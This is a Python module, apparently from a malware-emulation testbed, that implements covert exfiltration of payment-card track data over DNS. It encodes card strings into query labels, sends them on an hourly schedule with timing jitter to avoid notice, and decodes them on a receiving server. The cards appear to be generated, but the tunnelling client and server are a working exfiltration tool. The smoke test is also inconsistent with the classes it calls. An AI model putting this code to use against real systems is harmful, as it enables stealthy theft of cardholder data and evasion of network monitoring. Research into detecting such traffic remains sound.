import sys
from time import sleep
from typing import Tuple, Optional

from dnslib import DNSRecord, RR, QTYPE, A

from data.creditcard.ccgen import CreditCardGenerator
from malware import base, schedules
from malware.helper import delta_to_next_hour, jitter
from util import info, ok
from util import warning
from .encoding import encode_label, decode_label


class Client(base.Client):

    def __init__(self, domain: str):
        self.domain = domain or "plain.lan"
        self.data = None

    def send(self, cc_data: str):
        return f"{encode_label(cc_data)}.{self.domain}"

    def __str__(self):
        return '%s(%s)' % (type(self).__name__, ', '.join('%s=%s' % item for item in vars(self).items()))


class Server(base.Server):
    def receive(self, record: DNSRecord) -> DNSRecord:
        question = record.get_q()

        # Get payload from query
        payload = self.get_payload(question)
        if payload is not False:
            self.process(payload)

            # Respond
            reply = record.reply()
            reply.add_answer(RR(question.get_qname(), QTYPE.A, rdata=A(self.server_ip), ttl=3600))
            return reply

        else:
            info(f"[PlainText] Server: Ignoring query for other domain: {question.qname}")

    def process_payload(self, payload: str) -> Optional[str]:
        try:
            data = decode_label(payload)
            return data

        except:
            warning(f"[PlainText] Server: Could not decode payload: {payload}")
            return None


class Exfiltration(base.ExfiltrationThread):

    def __init__(self, client: Client, dns_settings: Tuple[str, int], log_dir: str, schedule: schedules.TypeA,
                 data_source: CreditCardGenerator = None):

        super().__init__(client, dns_settings, log_dir)
        self.schedule = schedule
        self.unlimited_credit_cards = data_source or CreditCardGenerator(track_type=2)

    def run(self):
        info("[PlainText] Started exfil thread.")

        last_hour = ""

        while True:
            current_hour, intv = self.schedule.get_interval()

            # No cards this hour
            if intv is None:
                # Sleep until next hour when there are no cards to exfiltrate
                sleep_time = max(1, delta_to_next_hour())

                info(f"[PlainText] No cards to exfiltrate this hour ({current_hour}:00).")
                info(f"[PlainText] Sleeping {sleep_time} seconds ({sleep_time / 60:.1f} minutes).")

                sleep(sleep_time)
                continue

            # Actual exfiltration here!
            if last_hour != current_hour:
                last_hour = current_hour
                info(f"[PlainText] Exfiltrating one card every {intv:.2f} seconds this hour ({current_hour}:00).")

            card, track_type = next(self.unlimited_credit_cards) or (ok("Exfil complete!") and sys.exit(0))

            query = self.client.send(card)

            self.analytics(1)
            info(self.print_debug("PlainText", 1))

            # Create DNSRecord and send!
            self.dns_query(query, 'A')

            # Sleep for interval (plus or minus 5% jitter)
            sleep(jitter(intv, jitter_range=.05))


def smoke_test():
    client = Client(domain="lan")
    data = ";2226789592775813=082696402650581?"
    query = client.send(data)

    server = Server(domain="bpos.lan")
    data_recv = server.receive("PzogOiotPzsjPi4rODgvPCcvOTgjPC0uOzsiOysnMz4uPS4pAAAA.bpos.lan")


if __name__ == "__main__":
    smoke_test()
